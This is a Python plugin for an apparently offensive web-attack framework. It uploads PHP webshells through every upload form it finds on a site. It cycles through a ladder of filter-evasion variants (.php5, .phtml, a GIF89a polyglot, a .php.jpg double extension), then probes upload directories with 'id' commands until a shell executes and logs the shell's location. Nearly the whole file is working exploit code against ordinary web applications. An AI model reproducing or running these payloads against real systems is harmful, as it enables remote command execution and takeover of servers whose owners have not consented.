"""
V1: Generic Upload-Form Fuzzing — vector plugin
Made for: AKAZZA / joyboyvoidera

POSTs the evasion ladder through every discovered upload form,
then probes candidate landing paths until a webshell EXECUTES.
"""
from datetime import datetime

UPLOAD_VARIANTS = [
    {"filename": "akz.php",      "content": "<?php system($_REQUEST['cmd']); ?>",        "mime": "application/x-php", "beats": "no filtering (DVWA Low)"},
    {"filename": "akz.php5",     "content": "<?php system($_REQUEST['cmd']); ?>",        "mime": "application/x-php", "beats": "'.php'-only blocklists"},
    {"filename": "akz.phtml",    "content": "<?php system($_REQUEST['cmd']); ?>",        "mime": "application/x-php", "beats": "'.php'-only blocklists"},
    {"filename": "akz.php",      "content": "GIF89a<?php system($_REQUEST['cmd']); ?>", "mime": "image/gif",         "beats": "content checks (polyglot, DVWA Medium)"},
    {"filename": "akz.php.jpg",  "content": "<?php system($_REQUEST['cmd']); ?>",        "mime": "image/jpeg",        "beats": "extension allowlists (Apache AddHandler)"},
]


@register_plugin("V1: upload fuzzing", phase="vector", priority=2,
                 cwe="CWE-434", attck="T1190",
                 wants=["upload_weak", "upload_form"],
                 avoids=["upload_strict"],
                 desc="generic upload-form fuzzing with a small evasion ladder")
def v1_upload_fuzz(akazza, surface, origin):
    """CONTRACT: return (shell_url, param) or (None, None)."""
    GREEN, YELLOW, RED, RESET = (col["GREEN"], col["YELLOW"], col["RED"], col["RESET"])

    if not surface["upload_forms"]:
        print(f"{YELLOW}[V1]{RESET} no upload forms found — skipping")
        return None, None

    sess = akazza._authenticated_sess
    param = CONFIG["shell_param"]

    for action_url, field, extras in surface["upload_forms"]:
        print(f"\n{GREEN}[V1]{RESET} fuzzing form: {action_url}")

        for v in UPLOAD_VARIANTS:
            print(f"  {YELLOW}[{v['filename']:<16}]{RESET} beats: {v['beats']}")
            content = v["content"].encode()
            files = {field: (v["filename"], content, v["mime"])}
            try:
                sess.post(action_url, files=files, data=extras,
                          timeout=CONFIG["timeout"])
            except Exception as e:
                print(f"    {RED}post error: {e}{RESET}")
                continue

            # locate the uploaded file: probe candidate dirs
            for base_dir in surface["interesting_dirs"]:
                for d in CONFIG["upload_dirs"]:
                    cand = f"{base_dir}{d}/{v['filename']}"
                    out = akazza.webshell_cmd(cand, param,
                                              "echo ___V1___; id", timeout=8)
                    if "___V1___" in out or "uid=" in out:
                        print(f"    {GREEN}[★] EXECUTES at {cand}{RESET}")
                        akazza.session_log.update({
                            "target_url": cand,
                            "shell_parameter": param,
                            "shell_variant": f"upload fuzz ({v['filename']})",
                            "vector": "V1: upload fuzzing",
                            "auto_uploaded": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        })
                        return cand, param

    print(f"\n{YELLOW}[V1]{RESET} exhausted without execution")
    return None, None
